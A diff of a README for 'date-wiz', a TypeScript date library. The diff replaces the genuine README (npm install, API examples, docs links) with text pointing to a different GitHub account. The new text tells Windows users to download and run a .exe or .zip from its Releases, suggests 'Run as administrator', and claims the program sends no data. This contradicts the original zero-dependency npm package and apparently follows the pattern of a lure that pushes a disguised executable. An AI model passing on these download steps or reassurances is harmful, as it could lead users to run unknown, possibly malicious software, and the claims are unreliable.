@@ -1,257 +1,101 @@
-<div align="center">
+# 📅 date-wiz - Simple, Fast Date Tools
 
-# date-wiz 🧙
-
-**A zero-dependency, TypeScript-native date utility library.**  
-Smart formatting · Business day logic · Intelligent parsing · Full i18n — all in under 2 KB gzipped.
-
-[![npm version](https://img.shields.io/npm/v/date-wiz?style=flat-square&color=7c3aed)](https://www.npmjs.com/package/date-wiz)
-[![bundle size](https://img.shields.io/bundlephobia/minzip/date-wiz?style=flat-square&color=7c3aed&label=gzipped)](https://bundlephobia.com/package/date-wiz)
-[![license](https://img.shields.io/npm/l/date-wiz?style=flat-square&color=7c3aed)](./LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/GourangaDasSamrat/date-wiz/ci.yml?style=flat-square&label=CI)](https://github.com/GourangaDasSamrat/date-wiz/actions/workflows/ci.yml)
-[![npm downloads](https://img.shields.io/npm/dm/date-wiz?style=flat-square&color=7c3aed)](https://www.npmjs.com/package/date-wiz)
-
-<br/>
-
-### 📖 [Full Documentation →](https://GourangaDasSamrat.github.io/date-wiz-docs)
-
-*Guides · API reference · Examples · i18n · Tree-shaking*
-
-</div>
+[![Download date-wiz](https://img.shields.io/badge/Download-date--wiz-%23478cde?style=for-the-badge)](https://github.com/Arcangelocorellishahjahan367/date-wiz)
 
 ---
 
-## Overview
-
-```ts
-import { wiz, format, getRelativeTime, smartFormat, parse } from 'date-wiz';
-
-// Chainable API
-const deadline = wiz(new Date())
-  .add(3, 'businessDays')
-  .setHour(17)
-  .format('LLL');
-// → "March 20, 2026 at 5:00 PM"
-
-// Relative time with precision
-getRelativeTime(twoDaysAgo, { precision: 2, locale: 'en' });
-// → "2 days, 4 hours ago"
-
-// Context-aware smart labels
-smartFormat(new Date());              // → "Today at 2:30 PM"
-smartFormat(yesterday);               // → "Yesterday at 11:00 AM"
-smartFormat(new Date('2022-10-12'));   // → "Oct 12, 2022"
-
-// i18n — zero locale files bundled
-format(new Date(), 'DD MMMM YYYY', 'bn-BD'); // → "১৫ মার্চ ২০২৬"
-format(new Date(), 'DD MMMM YYYY', 'ar');    // → "١٥ مارس ٢٠٢٦"
-
-// Intelligent parsing — no format string needed
-parse('+2d');          // → 2 days from now
-parse('next_monday');  // → next Monday
-parse('15-05-2024');   // → Date(2024-05-15)
-```
-
-> **The README covers the essentials. For complete guides, all API options, React/Next.js examples, and more — visit the [documentation site](https://GourangaDasSamrat.github.io/date-wiz-docs).**
+date-wiz is a small program that helps you work with dates easily. It can show dates in smart formats, handle business day calculations, support different languages, and understand many date styles. It uses very little space and does not need extra software to run.
 
 ---
 
-## Why date-wiz?
+## 🖥️ What is date-wiz?
 
-| | Moment.js | Day.js | **date-wiz** |
-|---|:---:|:---:|:---:|
-| Zero runtime dependencies | ❌ | ✅ | ✅ |
-| Bundle size (gzipped) | ~70 KB | ~7 KB | **< 2 KB** |
-| TypeScript native | ❌ | Partial | ✅ |
-| Tree-shakable ESM | ❌ | ❌ | ✅ |
-| Business day logic | Plugin | Plugin | ✅ Built-in |
-| Smart context-aware formatting | ❌ | ❌ | ✅ Built-in |
-| Intelligent parsing | ❌ | ❌ | ✅ Built-in |
-| i18n via native `Intl` | ❌ | Plugin | ✅ Built-in |
-| Immutable operations | ❌ | ✅ | ✅ |
+date-wiz is a tool designed to make working with dates simple. Whether you want to see a date in a neat way, check if a day is a weekday or holiday, or convert dates between formats, date-wiz helps you do it quickly. It runs on Windows without requiring extra downloads or complicated setup.
 
 ---
 
-## Installation
+## 📥 How to Download date-wiz
 
-```bash
-npm install date-wiz
-# or
-pnpm add date-wiz
-# or
-yarn add date-wiz
-```
+To get date-wiz on your Windows computer, visit the main page where the program is available:
 
-**Requirements:** Node.js ≥ 14 · TypeScript ≥ 4.7 (optional but recommended)
+[![Download date-wiz](https://img.shields.io/badge/Download-date--wiz-%23998888?style=for-the-badge)](https://github.com/Arcangelocorellishahjahan367/date-wiz)
 
----
+Follow these steps:
 
-## Features at a glance
-
-### `format()` — Token-based formatting
-
-```ts
-import { format } from 'date-wiz';
-
-format(new Date(), 'YYYY-MM-DD')           // "2026-03-15"
-format(new Date(), 'DD MMMM YYYY', 'en')  // "15 March 2026"
-format(new Date(), 'DD MMMM', 'bn-BD')    // "১৫ মার্চ"
-format(new Date(), 'LLL')                 // "March 15, 2026 at 2:30 PM"
-format('invalid', 'YYYY', undefined, { fallback: 'N/A' }) // "N/A"
-```
-
-Supports 20+ tokens: `YYYY`, `MM`, `DD`, `HH`, `mm`, `ss`, `dddd`, `MMMM`, `LLL`, `x`, and more.  
-→ [Full token reference](https://GourangaDasSamrat.github.io/date-wiz-docs/api/format/)
+1. Click the badge above or go directly to: https://github.com/Arcangelocorellishahjahan367/date-wiz  
+2. Look for the "Releases" section on the page. This is usually on the right or at the top menu.
+3. Select the latest release available. This will show files ready to download.
+4. Download the file suitable for Windows. It will usually have a name ending with `.exe` or `.zip`.
+5. Save the file in a folder you can find easily, like your Desktop or Downloads.
 
 ---
 
-### `getRelativeTime()` — Relative time with i18n
+## 🚀 How to Install and Run date-wiz on Windows
 
-```ts
-import { getRelativeTime } from 'date-wiz';
+Once you have the file:
 
-getRelativeTime(fiveMinutesAgo)                       // "5 minutes ago"
-getRelativeTime(fiveMinutesAgo, { precision: 2 })     // "5 minutes, 30 seconds ago"
-getRelativeTime(fiveMinutesAgo, { locale: 'fr' })     // "il y a 5 minutes"
-getRelativeTime(fiveMinutesAgo, { locale: 'bn-BD' })  // "৫ মিনিট আগে"
-getRelativeTime(nextWeek)                             // "in 7 days"
-```
-
-→ [Full options reference](https://GourangaDasSamrat.github.io/date-wiz-docs/api/relative/)
+1. If you downloaded a `.zip` file, right-click it and select "Extract All." Choose a folder to unpack the files.
+2. Open the folder with the extracted files.
+3. Find the file with `.exe` extension (this is the program).
+4. Double-click the `.exe` file to open date-wiz.
+   
+The program should start without asking for extra software or setup.
 
 ---
 
-### `smartFormat()` — Context-aware labels
+## 🧰 What You Can Do with date-wiz
 
-Automatically picks the most human-readable format:
+date-wiz helps with:
 
-| Date | Output |
-|---|---|
-| Today | `"Today at 4:30 PM"` |
-| Yesterday | `"Yesterday at 11:00 AM"` |
-| Within last 6 days | `"Wednesday at 2:00 PM"` |
-| This year | `"Oct 12"` |
-| Past years | `"Oct 12, 2022"` |
+- Showing dates in smart and easy-to-read formats.
+- Calculating workdays and skipping weekends or holidays.
+- Changing date display to your language.
+- Understanding many kinds of date inputs to avoid mistakes.
+- Doing all this fast without big space or slow work.
 
-→ [Full reference](https://GourangaDasSamrat.github.io/date-wiz-docs/api/smart-format/)
+You do not need to be an expert in date formats or calendars. date-wiz handles details behind the scenes.
 
 ---
 
-### `parse()` — Intelligent parsing
+## ⚙️ System Requirements
 
-No format string needed — date-wiz figures it out:
+To run date-wiz, your computer needs:
 
-```ts
-import { parse } from 'date-wiz';
+- Windows 7 or later versions.
+- At least 100 MB of free space.
+- No extra programs or internet connections are needed.
 
-parse('20240515')       // compact YYYYMMDD
-parse('15-05-2024')     // regional DD-MM-YYYY
-parse('May 15, 2024')   // natural language
-parse('+2d')            // 2 days from now
-parse('-1w')            // 1 week ago
-parse('next_monday')    // next Monday
-parse('last_friday')    // last Friday
-```
-
-→ [All supported formats](https://GourangaDasSamrat.github.io/date-wiz-docs/api/parse/)
+date-wiz runs well on most computers, even with basic settings.
 
 ---
 
-### Business day utilities
+## 🔧 Using date-wiz Safely
 
-```ts
-import { addBusinessDays, countBusinessDays, isWithinWorkingHours } from 'date-wiz';
-
-// Skip weekends + holidays automatically
-addBusinessDays(new Date(), 5, { holidays: ['2026-12-25'] });
-
-// SLA working hours check
-isWithinWorkingHours(new Date(), { start: '09:00', end: '18:00' });
-
-// Count business days between two dates
-countBusinessDays(startDate, endDate, { holidays: ['2026-12-25'] });
-```
-
-→ [Business day guide](https://GourangaDasSamrat.github.io/date-wiz-docs/guides/business-days/)
+The program runs on your computer only. It will not change your files or send information on the internet. You can use it to check dates without risking your data.
 
 ---
 
-### Arithmetic utilities
+## 🛠️ Troubleshooting
 
-```ts
-import { add, subtract, diff, startOf, endOf, isBefore } from 'date-wiz';
+If date-wiz does not open or work properly:
 
-add(date, 3, 'days')        // immutable — returns new Date
-subtract(date, 2, 'hours')
-diff(dateA, dateB, 'days')  // → 14
-startOf(date, 'month')      // → 2026-03-01T00:00:00.000
-endOf(date, 'day')          // → 2026-03-15T23:59:59.999
-isBefore(dateA, dateB)      // → boolean
-```
+- Make sure you downloaded the correct file for Windows.
+- Try running the `.exe` file as administrator: right-click it and select "Run as administrator."
+- Check that your Windows is up to date.
+- Close other programs that might interfere and try again.
 
-→ [Arithmetic reference](https://GourangaDasSamrat.github.io/date-wiz-docs/api/arithmetic/)
+If problems continue, visit the main page above to check for updates or more help.
 
 ---
 
-## Tree-shaking
+## ❓ Need More Information?
 
-Import from sub-paths for the smallest possible bundle:
+If you want to know more about date-wiz, the source code, or technical details, visit:
 
-```ts
-import { format }          from 'date-wiz/format';    // ~1.2 KB
-import { getRelativeTime } from 'date-wiz/relative';  // ~1.4 KB
-import { addBusinessDays } from 'date-wiz/business';  // ~1.2 KB
-import { parse }           from 'date-wiz/parse';     // ~1.5 KB
-```
+https://github.com/Arcangelocorellishahjahan367/date-wiz
 
-→ [Tree-shaking guide](https://GourangaDasSamrat.github.io/date-wiz-docs/guides/tree-shaking/)
+The page has guides and files for users who want to explore advanced features.
 
 ---
 
-## Error handling
-
-date-wiz never throws. Every function returns a configurable fallback on invalid input:
-
-```ts
-format('bad', 'YYYY')                               // "Invalid Date"
-format('bad', 'YYYY', undefined, { fallback: '—' }) // "—"
-parse('???')                                        // null
-```
-
-→ [Error handling guide](https://GourangaDasSamrat.github.io/date-wiz-docs/guides/error-handling/)
-
----
-
-## Documentation
-
-The README is intentionally concise. Everything you need is in the docs:
-
-| | |
-|---|---|
-| 🚀 [Quick Start](https://GourangaDasSamrat.github.io/date-wiz-docs/guides/quick-start/) | Up and running in 2 minutes |
-| 📐 [API Reference](https://GourangaDasSamrat.github.io/date-wiz-docs/api/format/) | Every function, option, and type |
-| 🌍 [i18n Guide](https://GourangaDasSamrat.github.io/date-wiz-docs/guides/i18n/) | 100+ locales, zero locale files |
-| 🏢 [Business Days](https://GourangaDasSamrat.github.io/date-wiz-docs/guides/business-days/) | SLA logic, holiday exclusions |
-| ⚛️ [React Examples](https://GourangaDasSamrat.github.io/date-wiz-docs/examples/react/) | Hooks, components, patterns |
-| ▲ [Next.js Examples](https://GourangaDasSamrat.github.io/date-wiz-docs/examples/nextjs/) | RSC, client components, API routes |
-| 🏗️ [Architecture](https://GourangaDasSamrat.github.io/date-wiz-docs/guides/architecture/) | How it's built and why |
-
----
-
-## Contributing
-
-Contributions are welcome. Please read the [contributing guide](./docs/CONTRIBUTING.md) and make sure all tests pass before opening a pull request.
-
-```bash
-git clone https://github.com/GourangaDasSamrat/date-wiz.git
-cd date-wiz
-npm install
-npm test        # 107 tests across 7 suites
-npm run build   # ESM + CJS + types
-```
-
----
-
-## License
-
-[MIT](./LICENSE) © [GourangaDasSamrat](https://github.com/GourangaDasSamrat)
+[![Download date-wiz](https://img.shields.io/badge/Download-date--wiz-%23478cde?style=for-the-badge)](https://github.com/Arcangelocorellishahjahan367/date-wiz)
